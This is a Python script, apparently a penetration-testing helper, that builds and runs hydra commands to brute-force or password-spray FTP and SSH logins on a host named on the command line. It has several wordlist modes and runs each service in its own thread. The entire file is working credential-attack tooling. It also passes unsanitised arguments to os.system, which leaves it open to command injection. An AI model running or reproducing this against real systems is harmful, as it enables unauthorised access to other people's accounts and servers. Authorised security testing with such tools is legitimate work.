import os
import sys
import threading

wordlist = sys.argv[1]
host = sys.argv[2]
services = sys.argv[3]
rootDir = sys.argv[4]
sprayMode = sys.argv[5]

global HCwordlist
HCwordlist = {"user":"./wordlist/top-usernames-shortlist.txt","pass":"./wordlist/UserPassCombo-Jay.txt"}

def bruteFTP(host,wordlist, rootDir, mode):
    global HCwordlist
    rootDir = os.path.join(rootDir, "spray")
    #print(rootDir)
    try:
        os.mkdir(rootDir)
    except:
        pass
    if mode == "passOnly":
        bruteFTPcmd = "hydra -s 21 -t 20 -L {} -P {} -vV ftp://{} -o {}/FTP.txt -I ".format(HCwordlist["user"] ,wordlist,host, rootDir)
    elif mode == "userOnly":
        bruteFTPcmd = "hydra -s 21 -t 20 -L {} -P {} -vV ftp://{} -o {}/FTP.txt -I ".format(wordlist,HCwordlist["pass"],host, rootDir)
    elif mode == "comboMode":
        bruteFTPcmd = "hydra -s 21 -t 20 -C {} -vV ftp://{} -o {}/FTP.txt -I ".format(wordlist,host, rootDir)
    elif mode == "User as Password":
        bruteFTPcmd = "hydra -s 21 -t 20 -L {} -e s -vV ftp://{} -o {}/FTP.txt -I ".format(wordlist, host, rootDir)
    else:
        bruteFTPcmd = "rip"
    print(bruteFTPcmd)
    os.system(bruteFTPcmd)

def bruteSSH(host,wordlist, rootDir, mode):
    global HCwordlist
    rootDir = os.path.join(rootDir, "spray")
    #print(rootDir)
    try:
        os.mkdir(rootDir)
    except:
        pass
    if mode == "passOnly":
        bruteSSHcmd = "hydra -s 22 -t 20 -L {} -P {} -vV ssh://{} -o {}/SSH.txt -I ".format(HCwordlist["user"] ,wordlist,host, rootDir)
    elif mode == "userOnly":
        bruteSSHcmd = "hydra -s 22 -t 20 -L {} -P {} -vV ssh://{} -o {}/SSH.txt -I ".format(wordlist,HCwordlist["pass"],host, rootDir)
    elif mode == "comboMode":
        bruteSSHcmd = "hydra -s 22 -t 20 -C {} -vV ssh://{} -o {}/SSH.txt -I ".format(wordlist,host, rootDir)
    elif mode == "User as Password":
        bruteSSHcmd = "hydra -s 22 -t 20 -L {} -e s -vV ssh://{} -o {}/SSH.txt -I ".format(wordlist, host, rootDir)
    else:
        bruteSSHcmd = "rip"
    print(bruteSSHcmd)
    os.system(bruteSSHcmd)



tbruteFTP = threading.Thread(target=bruteFTP, args=(host,wordlist,rootDir,sprayMode,))
tbruteSSH = threading.Thread(target=bruteSSH, args=(host, wordlist, rootDir,sprayMode,))
sDict = {"ftp":tbruteFTP,"ssh":tbruteSSH}

#print(wordlist)
#print(host)
#print(services)



listServices = services.split(',')

for service in listServices:
    if service in sDict:
        sDict[service].start()
    else:
        pass


